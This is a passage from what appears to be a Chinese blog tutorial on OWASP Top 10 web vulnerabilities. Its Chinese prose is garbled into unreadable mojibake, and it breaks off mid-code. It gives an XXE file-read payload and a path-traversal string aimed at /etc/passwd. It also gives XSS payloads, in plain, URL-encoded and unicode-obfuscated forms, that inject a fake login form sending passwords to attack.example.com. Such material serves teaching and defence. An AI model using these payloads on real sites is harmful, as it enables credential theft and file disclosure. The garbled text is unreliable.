´åäº†ç”¨æˆ·çš„è®¡ç®—æœºï¼Œåˆ™è¿™å°†å…¬å¼€ç”¨æˆ·çš„ç™»å½•ä¿¡æ¯ï¼Œå³ä½¿ç”¨æˆ·çš„è®¡ç®—æœºæ²¡æœ‰å—åˆ°æŸå®³ï¼Œå½“è¿™ç§å¼±ç‚¹åŠ ä¸Šè·¨ç«™ç‚¹è„šæœ¬å¯èƒ½ä½¿æ”»å‡»è€…è¿œç¨‹å¤åˆ¶cookie</p><h4 id="Prevent-2"><a href="#Prevent-2" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å¯¹åº”ç”¨ç¨‹åºå¤„ç†ï¼Œå­˜å‚¨æˆ–ä¼ è¾“çš„æ•°æ®è¿›è¡Œåˆ†ç±»ã€‚</li><li>ä¸å­˜å‚¨ä¸å¿…è¦çš„æ•æ„Ÿæ•°æ®ï¼Œå°½å¿«å°†å…¶ä¸¢å¼ƒ</li><li>ç¡®ä¿å¯¹é™æ€çš„æ‰€æœ‰æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¹¶ä¸”ä½¿ç”¨æœ€æ–°ä¸”åŠŸèƒ½å¼ºå¤§çš„æ ‡å‡†ç®—æ³•ï¼Œåè®®å’Œå¯†é’¥</li><li>ä½¿ç”¨å®‰å…¨åè®®å¯¹ä¼ è¾“ä¸­çš„æ‰€æœ‰æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œå¦‚httpsï¼Œhsts</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">A3:2017-Sensitive Data Exposure</a></p><h3 id="XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰"><a href="#XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰" class="headerlink" title="XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰"></a>XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰</h3><h4 id="ç®€ä»‹-3"><a href="#ç®€ä»‹-3" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>XXE å…¨ç§°ä¸ºXML External Entity attack å³XML<a href="https://baike.baidu.com/item/å¯æ‰©å±•æ ‡è®°è¯­è¨€/2885849?fromtitle=xml&fromid=86251&fr=aladdin">(å¯æ‰©å±•æ ‡è®°è¯­è¨€)</a> å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œæ—©æœŸæˆ–é…ç½®é”™è¯¯çš„XMLå¤„ç†å™¨è¯„ä¼°äº†XMLæ–‡ä»¶å¤–éƒ¨å®ä½“å¼•ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´çªƒå–URI(<a href="https://baike.baidu.com/item/URI/16481812">ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦</a>)æ–‡ä»¶å¤„ç†å™¨çš„å†…éƒ¨æ–‡ä»¶å’Œå…±äº«æ–‡ä»¶ã€ç›‘å¬å†…éƒ¨æ‰«æç«¯å£ã€æ‰§è¡Œè¿œç¨‹ä»£ç å’Œå®æ–½<a href="https://baike.baidu.com/item/æ‹’ç»æœåŠ¡æ”»å‡»/421896?fr=aladdin">æ‹’ç»æœåŠ¡æ”»å‡»</a>ã€‚</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>å…·ä½“å‚è€ƒæœ¬ç«™ï¼š<a href="https://www.extrader.top/posts/55c267c8/">XXEå­¦ä¹ ç¬”è®°</a></p><h4 id="Prevent-3"><a href="#Prevent-3" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å°½å¯èƒ½ä½¿ç”¨ä¸å¤ªå¤æ‚çš„æ•°æ®æ ¼å¼ï¼ˆå¦‚ï¼šJSONï¼‰é¿å…æ•æ„Ÿæ•°æ®çš„åºåˆ—åŒ–</li><li>ä¿®è¡¥æˆ–å‡çº§åº”ç”¨ç¨‹åºæˆ–åŸºç¡€æ“ä½œç³»ç»Ÿä¸Šæ­£åœ¨ä½¿ç”¨çš„æ‰€æœ‰XMLå¤„ç†å™¨å’Œåº“</li><li>åœ¨åº”ç”¨ç¨‹åºçš„æ‰€æœ‰XMLè§£æå™¨ä¸­ç¦ç”¨XMLå¤–éƒ¨å®ä½“å’ŒDTDå¤„ç†ã€‚</li><li>åœ¨æœåŠ¡å™¨ç«¯å®æ–½â€œç™½åå•â€è¾“å…¥éªŒè¯ï¼Œè¿‡æ»¤æˆ–æ¸…ç†æ“ä½œ</li></ol><h3 id="å¤±æ•ˆçš„è®¿é—®æ§åˆ¶"><a href="#å¤±æ•ˆçš„è®¿é—®æ§åˆ¶" class="headerlink" title="å¤±æ•ˆçš„è®¿é—®æ§åˆ¶"></a>å¤±æ•ˆçš„è®¿é—®æ§åˆ¶</h3><h4 id="ç®€ä»‹-4"><a href="#ç®€ä»‹-4" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>é€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œå¯ä»¥è®¿é—®å…¶ä»–ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ²¡æœ‰å®æ–½æ°å½“çš„è®¿é—®æƒé™ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å»æŸ¥çœ‹æœªæˆæƒçš„åŠŸèƒ½å’Œæ•°æ®ï¼Œä¾‹ï¼šè®¿é—®ç”¨æˆ·çš„è´¦æˆ·ã€æ•æ„Ÿæ–‡ä»¶ã€è·å–å’Œæ­£å¸¸ç”¨æˆ·ç›¸åŒçš„æƒé™ç­‰.</p><h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> <span class="token variable">$dataPath</span> <span class="token operator">=</span> <span class="token string">"/users/cwe/profiles"</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$username</span> <span class="token operator">=</span> param<span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$profilePath</span> <span class="token operator">=</span> <span class="token variable">$dataPath</span> <span class="token operator">.</span> <span class="token string">"/"</span> <span class="token operator">.</span> <span class="token variable">$username</span><span class="token punctuation">;</span>open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">"&lt;$profilePath"</span><span class="token punctuation">)</span> <span class="token operator">||</span> ExitError<span class="token punctuation">(</span><span class="token string">"profile read error: $profilePath"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">print</span> <span class="token string">"&lt;li>$_&lt;/li>\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span> <span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç å¯èƒ½é€‚ç”¨äºç¤¾äº¤ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œå…¶ä¸­ç”¨æˆ·çš„ä¸ªäººèµ„æ–™ä¿¡æ¯éƒ½å­˜å‚¨åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½å­˜å‚¨åœ¨ä¸€ä¸ªç›®å½•ä¸­</p><p>å°½ç®¡ç¨‹åºå‘˜æ‰“ç®—è®¿é—®â€œ/users/cwe/profiles/aliceâ€ä¹‹ç±»çš„æ–‡ä»¶ï¼Œä½†æ²¡æœ‰éªŒè¯ä¼ å…¥çš„ç”¨æˆ·å‚æ•°ã€‚æ”»å‡»è€…å¯èƒ½ä¼šæä¾›ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š</p><pre class="language-none"><code class="language-none">..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>è¯¥ç¨‹åºå°†ç”Ÿæˆå¦‚ä¸‹çš„é…ç½®æ–‡ä»¶è·¯å¾„åï¼š</p><pre class="language-none"><code class="language-none">&#x2F;users&#x2F;cwe&#x2F;profiles&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre><p>æ‰“å¼€æ–‡ä»¶åï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨è·¯å¾„è§„èŒƒåŒ–æœŸé—´è§£æâ€œ ../â€ï¼Œå¹¶å®é™…è®¿é—®æ­¤æ–‡ä»¶ï¼š</p><pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;passwd</code></pre><p>ç»“æœï¼Œæ”»å‡»è€…å¯ä»¥é˜…è¯»å¯†ç æ–‡ä»¶çš„æ•´ä¸ªæ–‡æœ¬</p><h4 id="Prevent-4"><a href="#Prevent-4" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>é™¤å…¬å…±èµ„æºå¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‹’ç»</li><li>ä¸€æ¬¡å®æ–½è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œå¹¶åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡å¤ä½¿ç”¨å®ƒä»¬ï¼ŒåŒ…æ‹¬æœ€å¤§ç¨‹åº¦åœ°å‡å°‘<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>çš„ä½¿ç”¨ã€‚</li><li>ç¦ç”¨WebæœåŠ¡å™¨ç›®å½•åˆ—è¡¨ï¼Œå¹¶ç¡®ä¿Webæ ¹ç›®å½•ä¸­ä¸å­˜åœ¨æ–‡ä»¶å…ƒæ•°æ®ï¼ˆä¾‹å¦‚.gitï¼‰å’Œå¤‡ä»½æ–‡ä»¶ã€‚</li><li>é™é€ŸAPIå’Œæ§åˆ¶å™¨è®¿é—®æƒé™ï¼Œä»¥æœ€å¤§ç¨‹åº¦å‡å°‘è‡ªåŠ¨æ”»å‡»å·¥å…·å¸¦æ¥çš„å±å®³ã€‚</li></ol><h3 id="å®‰å…¨é…ç½®é”™è¯¯"><a href="#å®‰å…¨é…ç½®é”™è¯¯" class="headerlink" title="å®‰å…¨é…ç½®é”™è¯¯"></a>å®‰å…¨é…ç½®é”™è¯¯</h3><h4 id="ç®€ä»‹-5"><a href="#ç®€ä»‹-5" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å®‰å…¨é…ç½®é”™è¯¯æ˜¯æ¯”è¾ƒå¸¸è§çš„æ¼æ´ï¼Œç”±äºæ“ä½œè€…çš„ä¸å½“é…ç½®(é»˜è®¤é…ç½®ï¼Œä¸´æ—¶é…ç½®ï¼Œå¼€æºäº‘å­˜å‚¨ï¼Œhttpæ ‡å¤´é…ç½®ï¼Œä»¥åŠåŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¯¦ç»†é”™è¯¯)ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº›é…ç½®è·å–åˆ°æ›´é«˜çš„æƒé™ï¼Œå®‰å…¨é…ç½®é”™è¯¯å¯ä»¥å‘ç”Ÿåœ¨å„ä¸ªå±‚é¢ï¼ŒåŒ…å«å¹³å°ã€webæœåŠ¡å™¨ã€åº”ç”¨æœåŠ¡å™¨ã€æ•°æ®åº“ã€æ¶æ„å’Œä»£ç ã€‚</p><h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"config.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> password <span class="token operator">=</span> prop<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸‹ä»£ç ä»å±æ€§æ–‡ä»¶ä¸­è¯»å–å¯†ç ï¼Œå¹¶ä½¿ç”¨è¯¥å¯†ç è¿æ¥åˆ°æ•°æ®åº“ã€‚</p><p>è¯¥ä»£ç å°†æˆåŠŸè¿è¡Œï¼Œä½†æ˜¯æœ‰æƒè®¿é—®config.propertiesçš„ä»»ä½•äººéƒ½å¯ä»¥è¯»å–å¯†ç çš„å€¼ã€‚å¦‚æœæ”»å‡»è€…æœ‰æƒè®¿é—®æ­¤ä¿¡æ¯ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å®ƒæ¥å…¥ä¾µç³»ç»Ÿã€‚</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256: Unprotected Storage of Credentials</a></p><h4 id="Prevent-5"><a href="#Prevent-5" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>è‡ªåŠ¨åŒ–å®‰è£…éƒ¨ç½²ï¼Œä¿è¯å¼€å‘ï¼ŒQAï¼Œäº§å“ç¯å¢ƒçš„é…ç½®å°½é‡ç›¸åŒï¼Œå‡å°‘éƒ¨ç½²ä¸€ä¸ªæ–°å®‰å…¨ç¯å¢ƒçš„è€—è´¹ï¼Œ</li><li>åŠæ—¶äº†è§£å¹¶éƒ¨ç½²æ¯ä¸ªç¯å¢ƒçš„è½¯ä»¶æ›´æ–°å’Œè¡¥ä¸ä¿¡æ¯</li><li>ä½¿ç”¨æä¾›æœ‰æ•ˆåˆ†ç¦»çš„å®‰å…¨æ€§å¼ºå¤§çš„åº”ç”¨ç¨‹åºæ¶æ„</li><li>å®æ–½æ¼æ´æ‰«æå’Œå®‰å…¨å®¡è®¡ï¼Œä»¥å¸®åŠ©æ£€æŸ¥é”™è¯¯çš„é…ç½®æˆ–è€…æœªå®‰è£…çš„è¡¥ä¸</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">A6ï¼š2017-å®‰å…¨æ€§é”™è¯¯é…ç½®</a></p><h3 id="è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰"><a href="#è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰" class="headerlink" title="è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰"></a>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰</h3><h4 id="ç®€ä»‹-6"><a href="#ç®€ä»‹-6" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>xssæ”»å‡»å…¨ç§°ä¸º<a href="https://baike.baidu.com/item/XSSæ”»å‡»/954065?fr=aladdin">è·¨ç«™è„šæœ¬æ”»å‡»</a>,å½“åº”ç”¨ç¨‹åºçš„æ–°ç½‘é¡µä¸­åŒ…å«ä¸å—ä¿¡ä»»çš„ã€æœªç»æ°å½“éªŒè¯ã€è½¬ä¹‰çš„æ•°æ®æˆ–å¯ä»¥ä½¿ç”¨HTMLã€JavaScriptçš„æµè§ˆå™¨APIæ›´æ–°çš„ç°æœ‰ç½‘é¡µæ—¶ï¼Œå°±ä¼šå‡ºç°xssæ¼æ´ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æœ€æ™®éçš„webåº”ç”¨å®‰å…¨æ¼æ´ï¼Œç”šè‡³åœ¨æŸäº›å®‰å…¨å¹³å°éƒ½å­˜åœ¨xssæ¼æ´ã€‚xssä¼šæ‰§è¡Œæ”»å‡»è€…åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œçš„è„šæœ¬ï¼Œå¹¶åŠ«æŒç”¨æˆ·ä¼šè¯ï¼Œç ´åç½‘ç«™æˆ–ç”¨æˆ·é‡å®šå‘åˆ°æ¶æ„ç«™ç‚¹ï¼Œä½¿ç”¨xssè¿˜å¯ä»¥æ‰§è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p><h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example"></a>Example</h4><h5 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="header"> Welcome, '</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç åŸºäºHTTP GETç”¨æˆ·åå‚æ•°åœ¨ç½‘é¡µä¸Šæ˜¾ç¤ºæ¬¢è¿æ¶ˆæ¯ã€‚</p><p>ç”±äºå‚æ•°å¯ä»¥æ˜¯ä»»æ„çš„ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹é¡µé¢çš„urlï¼Œå› æ­¤<code>$username</code>å¯ä»¥åŒ…å«è„šæœ¬è¯­æ³•ï¼Œä¾‹å¦‚ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript">alert("You've been attacked!");&lt;/Script></code></pre><p>è¿™æ ·ä¼šå¼¹å‡ºæ— å®³çš„è­¦å‘Šå¯¹è¯æ¡†ï¼Œæœ€åˆè¿™ä¸æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ¼æ´ï¼Œæ¯•ç«Ÿï¼Œä¸ºä»€ä¹ˆæœ‰äººè¾“å…¥ä¸€ä¸ªå¯¼è‡´æ¶æ„ä»£ç åœ¨å…¶è‡ªå·±çš„è®¡ç®—æœºä¸Šè¿è¡Œçš„URLï¼ŸçœŸæ­£çš„å±é™©åœ¨äºï¼Œæ”»å‡»è€…å°†åˆ›å»ºæ¶æ„URLï¼Œç„¶åä½¿ç”¨ç”µå­é‚®ä»¶æˆ–ç¤¾äº¤å·¥ç¨‹æŠ€å·§è¯±ä½¿å—å®³è€…è®¿é—®URLçš„é“¾æ¥ã€‚å½“å—å®³è€…å•å‡»é“¾æ¥æ—¶ï¼Œä»–ä»¬ä¼šé€šè¿‡æ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºä¸ç»æ„åœ°å°†æ¶æ„å†…å®¹åæ˜ å›è‡ªå·±çš„è®¡ç®—æœºã€‚æ›´ç°å®çš„æ˜¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨é¡µé¢ä¸ŠåµŒå…¥ä¸€ä¸ªä¼ªé€ çš„ç™»å½•æ¡†ï¼Œè¯±ä½¿ç”¨æˆ·å°†ç”¨æˆ·çš„å¯†ç å‘é€ç»™æ”»å‡»è€…ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword">Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: &lt;input type="text" name="username" />&lt;br/>Password: &lt;input type="password" name="password" />&lt;br/>&lt;input type="submit" value="Login" />&lt;/form>&lt;/div></code></pre><p>å¦‚æœç”¨æˆ·å•å‡»æ­¤é“¾æ¥ï¼Œé‚£ä¹ˆWelcome.phpå°†ç”Ÿæˆä»¥ä¸‹HTMLå¹¶å°†å…¶å‘é€åˆ°ç”¨æˆ·çš„æµè§ˆå™¨ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Welcome, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stealPassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Please Login:    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack.example.com/stealPassword.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        Password: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>ä½†æ˜¯ï¼Œç²¾æ˜çš„ç”¨æˆ·å¯èƒ½ä¼šæ³¨æ„åˆ°URLä¸Šé™„åŠ äº†å¯ç–‘æ–‡æœ¬ã€‚æ”»å‡»è€…å¯èƒ½è¿›ä¸€æ­¥æ··æ·†URLï¼ˆä»¥ä¸‹ç¤ºä¾‹é“¾æ¥åˆ†ä¸ºå¤šè¡Œä»¥æé«˜å¯è¯»æ€§ï¼‰ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A+%3Cinput+type%3D%22password%22+name%3D%22password%22+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</code></pre><p>ç›¸åŒçš„æ”»å‡»å­—ç¬¦ä¸²ä¹Ÿå¯èƒ½è¢«æ··æ·†ä¸ºï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript">document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script></code></pre><p>è¿™ä¸¤ä¸ªæ”»å‡»é“¾æ¥éƒ½å°†å¯¼è‡´é¡µé¢ä¸Šæ˜¾ç¤ºä¼ªé€ çš„ç™»å½•æ¡†ï¼Œå¹¶ä¸”ç”¨æˆ·æ›´æœ‰å¯èƒ½å¿½ç•¥URLæœ«å°¾çš„éš¾ä»¥ç†è§£çš„æ–‡æœ¬ã€‚</p><h5 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h5><p>CreateUser.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$fullName</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$fullName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Insert Into users (username,password) Values ("%s","%s","%s")'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token 